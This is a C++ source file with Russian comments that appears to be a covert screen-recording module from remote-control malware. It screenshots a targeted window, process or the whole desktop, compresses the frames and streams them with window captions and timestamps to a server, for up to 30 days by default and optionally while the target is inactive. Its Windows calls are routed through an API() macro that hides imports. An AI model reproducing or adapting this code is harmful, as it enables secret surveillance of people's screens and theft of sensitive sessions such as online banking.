#include "core\core.h"
#include "core\process.h"
#include "core\util.h"
#include <shlwapi.h>
#include <shlobj.h>
#include "WndRec\video.h"
#include "WndRec\sender.h"
#include "WndRec\manager.h"
#include "WndRec\stream.h"

namespace WndRec
{

#pragma pack(1)
struct Frame 
{
	short szStruct;
	short width;
	short height;
	int szData;
	short type; //0 - начальный кадр, 1 - изменения
	short szCaption; //размер заголовка окна, если 0, то он такой же как и предыдущем кадре
	//дата кадра
	short year;
	char month;
	char day; 
	char hour;
	char minute;
	char second;
};

struct HeadVideo
{
	char id[3];
	short szStruct;
	char freq;  //кадров в секунду
	short szNameVideo; //размер названия видео
	short szNameProcess; //размер названия процесса
};
#pragma pack()

struct ScreenShot
{
	int width;
	int height;
	int bits; //сколько бит на одну точку
	Mem::Data mem;
	Mem::Data image;
};


bool stopRecord = false;
SOCKET curr_sc = 0;

int elapsedSamples = 0; //количество записанных кадров
bool isRecord = false; //true если, запись видео запущена
bool sendFirstFrame = false; //если true, то нужно отослать начальный кадр (для онлайн видео)

static void GetNameProcess( DWORD pid, HWND hwnd, StringBuilder& name )
{
	if( pid == 0 )
	{
		pid = Process::GetPID(hwnd);
		if( pid == 0 )
			return;
	}
	Process::Name( pid, name );
}

static bool MakeScreenShot( HWND hWnd, ScreenShot* ss )
{
	// detect desktop or one window
	bool is_multimon    = API(USER32, GetSystemMetrics)(SM_CMONITORS) > 1 ? true : false;
	int sx              = 0;
	int sy              = 0;
	int sxpos           = 0;
	int sypos           = 0;
    int max_width       = 3000;
    int max_height      = 3000;
	HDC	dc              = NULL;
    HDC mydc            = NULL;
	HBITMAP bitmap      = NULL;
    HBITMAP oldbitmap   = NULL;
    RECT r;

	if ( hWnd == HWND_DESKTOP ) { 
		hWnd = API(USER32, GetDesktopWindow)();
		dc = API(USER32, GetDC)(hWnd);
        sx = API(USER32, GetSystemMetrics)(SM_CXVIRTUALSCREEN);
	    sy = API(USER32, GetSystemMetrics)(SM_CYVIRTUALSCREEN);
        sxpos = API(USER32, GetSystemMetrics)(SM_XVIRTUALSCREEN);
	    sypos = API(USER32, GetSystemMetrics)(SM_YVIRTUALSCREEN);
        if ( is_multimon ) {
            max_width = sx + 1;
            max_height = sy + 1;
        }
	} else {
		dc = API(USER32, GetWindowDC)(hWnd);    
        API(USER32, GetWindowRect)( hWnd, &r );
        sx = r.right - r.left + 1; // w
        sy = r.bottom - r.top + 1; // h
    }


	mydc = API(GDI32, CreateCompatibleDC)(dc);
    bitmap = API(GDI32, CreateCompatibleBitmap)( dc, sx, sy );
    oldbitmap = (HBITMAP) API(GDI32, SelectObject)( mydc, bitmap );
    API(GDI32, BitBlt)( mydc, 0, 0, sx, sy, dc, sxpos, sypos, SRCCOPY );

	//HDC dc = API(USER32, GetWindowDC)(hWnd);
 //   HDC mydc = API(GDI32, CreateCompatibleDC)(dc);
 //   RECT r;
 //   API(USER32, GetWindowRect)( hWnd, &r );
	//// kodx
	///*r.right = API(USER32, GetSystemMetrics)(SM_CXSCREEN); 
	//r.bottom = API(USER32, GetSystemMetrics)(SM_CYSCREEN);*/
 //   int w = r.right - r.left + 1;
 //   int h = r.bottom - r.top + 1;
 //   HBITMAP bitmap = API(GDI32, CreateCompatibleBitmap)( dc, w, h );
 //   HBITMAP oldbitmap = (HBITMAP) API(GDI32, SelectObject)( mydc, bitmap );
 //   API(GDI32, BitBlt)( mydc, 0, 0, w, h, dc, 0, 0, SRCCOPY );

    BITMAPINFO info;
    info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    info.bmiHeader.biBitCount = 0;
    API(GDI32, GetDIBits)( mydc, bitmap, 0, 0, 0, &info, DIB_RGB_COLORS );
    info.bmiHeader.biCompression = BI_RGB;
    info.bmiHeader.biBitCount = 24;
	bool ret = false;
	//if( info.bmiHeader.biWidth > 0 && info.bmiHeader.biWidth < 3000 && info.bmiHeader.biHeight > 0 && info.bmiHeader.biHeight < 3000 )
    if( info.bmiHeader.biWidth > 0 && info.bmiHeader.biWidth < max_width && info.bmiHeader.biHeight > 0 && info.bmiHeader.biHeight < max_height )
	{
		int memsz = (info.bmiHeader.biWidth * 3 + 3) * info.bmiHeader.biHeight;
		if( ss->mem.MakeEnough(memsz) )
		{
			API(GDI32, GetDIBits)( mydc, bitmap, 0, info.bmiHeader.biHeight, ss->mem.Ptr(), &info, DIB_RGB_COLORS );
			int sizeImage = info.bmiHeader.biWidth * info.bmiHeader.biHeight;
			if( ss->image.MakeEnough(sizeImage) )
			{
				ss->width = info.bmiHeader.biWidth;
				ss->height = info.bmiHeader.biHeight;
				ss->image.SetLen(sizeImage);
				ss->bits = 8;
				byte* to = ss->image.p_byte();
				//переводим в черно белое
				int lenRow = (ss->width * 3 + 3) & ~3; //количество байт должно быть кратно 4
				for( int i = ss->height - 1; i >= 0; i-- )
				{
					byte* p = ss->mem.p_byte() + i * lenRow;
					for( int j = 0; j < ss->width; j++, p += 3 )
						*to++ = (2125 * p[0] + 7154 * p[1] + 721 * p[2]) / 10000; //0 - red, 1 - green, 2 - blue
				}

				API(GDI32, SelectObject)( mydc, oldbitmap );
				API(GDI32, DeleteObject)(bitmap);
				API(GDI32, DeleteDC)(mydc);
				API(GDI32, DeleteDC)(dc);
				ret = true;
			}
		}
	}
	return ret;	
}

void LowerBits(ScreenShot* ss, int bits)
{
	byte* p = ss->image.p_byte();
	int len = ss->height * ss->width;
	int low = 8 - bits;
	while( len-- )
	{
		*p >>= low;
		p++;
	}
	ss->bits = bits;
}

void CalcDiffFrame( ScreenShot* last, ScreenShot* curr, ScreenShot& diff )
{
	int len = curr->height * curr->width;
	diff.image.MakeEnough(len);
	byte* p1 = last->image.p_byte();
	byte* p2 = curr->image.p_byte();
	byte* p3 = diff.image.p_byte();
	unsigned char mask = (1 << last->bits) - 1;
	while( len-- )
	{
		*p3++ = (*p2++ - *p1++) & mask;
	}
	diff.width = curr->width;
	diff.height = curr->height;
	diff.image.SetLen( curr->image.Len() );
	diff.bits = curr->bits;
}

int RLEFrameColor2Bits( byte* in, int c_in, byte* out, int c_out )
{
	byte* pi = in;
	byte* po = out;
	int sz = 0;
	while( c_in > 0 )
	{
		int counter = 0;
		byte s = *pi;
		while( c_in )
		{
			if( s != *pi ) break;
			counter++;
			pi++;
			c_in--;
		}
		while( counter > 0 && sz < c_out )
		{
			if( counter <= 32 ) // 0 + длина (5 бит) + цвет (2 бита)
			{
				counter--;
				*po++ = (counter << 2) | s;
				counter = 0;
				sz++;
			}
			else
				if( counter <= 4096 + 32 ) //10 + длина (12 бит) + цвет (2 бита)
				{
					counter -= 32 + 1;
					*po++ = 0x80 | (counter >> 6);
					*po++ = ((counter & 0x3f) << 2) | s;
					counter = 0;
					sz += 2;
				}
				else //11 + длина (20 бит) + цвет (2 бита)
				{
					int c = counter;
					if( c > (1 << 20) + 4096 + 32 ) c = (1 << 20) + 4096 + 32;
					counter -= c;
					c -= 4096 + 32 + 1;
					*po++ = 0xc0 | (c >> 14);
					*po++ = (c >> 6) & 0xff;
					*po++ = ((c & 0x3f) << 2) | s;
					sz += 3;
				}
		}
	}
	return sz;
}

uint CreateStreamVideo( ServerData* server, const char* nameVideo, const StringBuilder& nameProcess, int freq )
{
	HeadVideo hv;
	hv.id[0] = 'F'; hv.id[1] = 'R'; hv.id[2] = 'M';
	hv.freq = freq;
	hv.szStruct = sizeof(hv);
	hv.szNameVideo = Str::Len(nameVideo);
	hv.szNameProcess = nameProcess.Len();

	uint idStream = CreateStream( server, ID_VIDEO, 0, nameProcess.Len() == 0 ? nameVideo : nameProcess.c_str(), 0,  60 * 1000 );

	WriteStream( server, idStream, &hv, sizeof(hv) );
	if( hv.szNameVideo > 0 ) WriteStream( server, idStream, nameVideo, hv.szNameVideo );
	if( hv.szNameProcess > 0 ) WriteStream( server, idStream, nameProcess.c_str(), hv.szNameProcess );

	return idStream;
}


int Record( ServerData* server, const char* nameVideo, InOutData* iod, int bitsColor, int zoom, int freq, int recSecond, int flags )
{
	int ret = 0;
	ScreenShot frames[2];
	ScreenShot diff;
	ScreenShot* lastFrame = &frames[0];
	lastFrame->height = 0;
	lastFrame->width = 0;
	ScreenShot* currFrame = &frames[1];

	StringBuilderStack<64> nameProcess;
	StringBuilderStack<256> caption, caption2;
	int sizeVideo = 0; //отосланный размер видео файла, для того чтобы видео файл не превышал заданный размер
	int framesVideo = 0; //количество отосланных кадров

	LZWcode* lzwCodes = create_table_lzw();
	
	DbgMsg( "Start record name video: '%s'", nameVideo );

	GetNameProcess( iod->typeIn == 1 ? iod->pid : 0, iod->typeIn == 0 ? iod->hWnd : 0, nameProcess );
	
	uint idStream = CreateStreamVideo( server, nameVideo, nameProcess, freq );
	if( idStream == 0 ) return 2; //соединения нет

	caption[0] = 0;
	DbgMsg( "Name process: '%s', id stream: %d", nameProcess.c_str(), idStream );

	int samples = recSecond * freq;
	int delay = 1000 / freq;

	Mem::Data buf;
	Mem::Data cash; //кеш для кадров, сюда копируются кадры, которые отправятся на сервер при переполнении кеша
		
	while( elapsedSamples < samples && !stopRecord )
	{
		HWND topWnd = API(USER32, GetForegroundWindow)();
		bool rec = false;
		bool active = false; //активно ли окно которые пишем
		if( iod->typeIn == 0 )
		{
			if( iod->hWnd == HWND_DESKTOP || iod->hWnd == topWnd )
				rec = true, active = true;
		}
		else
		{
			DWORD pid = Process::GetPID(topWnd);
			if( pid == iod->pid )
				rec = true, active = true;
		}
		if( flags & VIDEO_ALWAYS ) rec = true;

		if( rec )
		{
			int type = 0;
			HWND shotWnd = (flags & VIDEO_FULLSCREEN) ? HWND_DESKTOP : topWnd;
			if( MakeScreenShot( shotWnd, currFrame ) )
			{
				if( lastFrame->height != currFrame->height || lastFrame->width != currFrame->width  )
				{
					buf.MakeEnough( currFrame->height * currFrame->width );
				}
				else
					//видео файл достиг заданного размер, посылаем серверу команду для закрытия текущего и создание нового файла
					if( server && (sizeVideo >= MAX_VIDEO_SIZE || framesVideo >= MAX_VIDEO_FRAMES)  ) 
					{
						CloseStream( server, idStream );
						idStream = CreateStreamVideo( server, nameVideo, nameProcess, freq );
						sizeVideo = 0;
						framesVideo = 0;
					}
					else
						if( sendFirstFrame )
							sendFirstFrame = false;
						else if( (framesVideo % PERIOD_FIRST_FRAME) == 0 )
						{
							DbgMsg("Шлем начальный кадр");
						}
						else
							type = 1; //разница кадров

				LowerBits( currFrame, bitsColor );
				Mem::Data* data = &currFrame->image;
				if( type == 1 )
				{
					CalcDiffFrame( lastFrame, currFrame, diff );
					data = &diff.image;
				}
				int resSz = RLEFrameColor2Bits( data->p_byte(), data->Len(), buf.p_byte(), buf.Size() );
				Frame frame;
				frame.szStruct = sizeof(frame);
				frame.width = currFrame->width;
				frame.height = currFrame->height;
				frame.szData = resSz;
				frame.type = type;
				//сохраняем дату и время кадра
				SYSTEMTIME tm;
				API(KERNEL32, GetLocalTime)(&tm);
				frame.year = tm.wYear;
				frame.month = (char)tm.wMonth;
				frame.day = (char)tm.wDay;
				frame.hour = (char)tm.wHour;
				frame.minute = (char)tm.wMinute;
				frame.second = (char)tm.wSecond;
				Window::GetCaption( topWnd, caption2 );
				if( !active ) caption2 += _CS_(" (not active)"); //говорим что наше окно не активно
				frame.szCaption = caption2.Len();
				if( caption == caption2 )
					frame.szCaption = 0;
				else
					DbgMsg( "Caption window: %s", caption2 );
				caption = caption2;

				cash.Append( &frame, sizeof(frame) );
				cash.Append( buf.Ptr(), resSz );
				if( frame.szCaption > 0 ) cash.Append( caption, frame.szCaption );
				if( cash.Len() > 4096 ) 
				{
					int sz = to_lzw( lzwCodes, cash.p_byte(), cash.Len(), buf.p_byte() + 4 );
					*((int*)buf.p_byte()) = sz;
					sz += 4;
//					WriteStream( server, idStream, cash.Ptr(), cash.Len() );
					WriteStream( server, idStream, buf.Ptr(), sz );
					cash.Clear();
				}
//				WriteStream( server, idStream, &frame, sizeof(frame) );
//				WriteStream( server, idStream, buf.Ptr(), resSz );
//				if( frame.szCaption > 0 ) WriteStream( server, idStream, caption, frame.szCaption );

				sizeVideo += sizeof(frame) + resSz + frame.szCaption;
				framesVideo++;

				ScreenShot* tmp = currFrame;
				currFrame = lastFrame;
				lastFrame = tmp;
				DbgMsg( "frame: %d, size: %d", framesVideo, resSz );
			}
		}
		else
		{
			//DbgMsg( "window not active" );
		}

		elapsedSamples++;
		if( (elapsedSamples % 10) == 0 ) //через каждый 10-й кадр смотрим существует ли процесс или окно которое пишем
			if( iod->typeIn == 0 ) //пишет с окна
			{
				if( iod->hWnd != HWND_DESKTOP )
				{
					if( Process::GetPID(iod->hWnd) == 0 ) //такого окна нет, завершаем запись
					{
						ret = 1;
						break;
					}
				}
			}
			else
			{
				HANDLE hproc = API(KERNEL32, OpenProcess)( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, iod->pid );
				if( hproc == 0 )
				{
					ret = 1;
					break;
				}
				API(KERNEL32, CloseHandle)(hproc);
			}
		Delay(delay);
	}
	if( elapsedSamples >= samples ) ret = 1; //закончили писать
	CloseStream( server, idStream ); 
	release_table_lzw(lzwCodes);
	DbgMsg( "exit from record %d", ret );
	return ret;
}

DWORD WINAPI RecordThread( LPVOID p )
{
	RecParam* rp = (RecParam*)p;
	elapsedSamples = 0;
	int seconds = rp->seconds ? rp->seconds : 24 * 3600 * 30;
	isRecord = true;
	while( !stopRecord )
	{
		int err = Record( rp->server, rp->nameVideo, &(rp->iod), 2, 1, 2, seconds, rp->flags );
		if( err == 1 ) break;
		Delay(1000);
	}
	DbgMsg( "video stop record" );
	Mem::Free(p);
	isRecord = false;
	return 0;
}

void StartRecHwnd( ServerData* server, const char* uid, char* nameVideo, HWND wnd, int seconds, int flags )
{
//	if( server == 0 ) return;
	if( isRecord ) //запись уже запущена
	{
		elapsedSamples = 0;
		return;
	}
	stopRecord = false;
	RecParam* p = (RecParam*)Mem::Alloc(sizeof(RecParam));
	Str::Copy( p->nameVideo, nameVideo );
	Str::Copy( p->uid, uid );

	p->iod.typeIn = 0;
	p->iod.hWnd = wnd;
	p->iod.typeOut  = 1;
	p->seconds = seconds;
	p->flags = flags;
	p->server = server;

	RunThread( RecordThread, p );
}

void StartRecPid( ServerData* server, const char* uid, char* nameVideo, DWORD pid, int seconds, int flags )
{
//	if( server == 0 ) return;
	DbgMsg( "Start record" );
	if( isRecord ) //запись уже запущена
	{
		elapsedSamples = 0;
		return;
	}
	stopRecord = false;
	RecParam* p = (RecParam*)Mem::Alloc(sizeof(RecParam));
	Str::Copy( p->nameVideo, nameVideo );
	Str::Copy( p->uid, uid );

	p->iod.typeIn = 1;
	p->iod.pid = pid;
	p->iod.typeOut  = 1;
	p->seconds = seconds;
	p->flags = flags;
	p->server = server;

    RunThread( RecordThread, p );
}

void SendFirstFrame( ServerData* server )
{
	sendFirstFrame = true;
}

void StopRec()
{
	DbgMsg( "Stop record" );
	stopRecord = true;
	for( int i = 0; i < 10; i++ ) //ждем пока остановится запись
		if( isRecord )
			Delay(1000); 
		else
			break;
}

void ResetTime()
{
	DbgMsg( "Reset time" );
	elapsedSamples = 0;
}

};
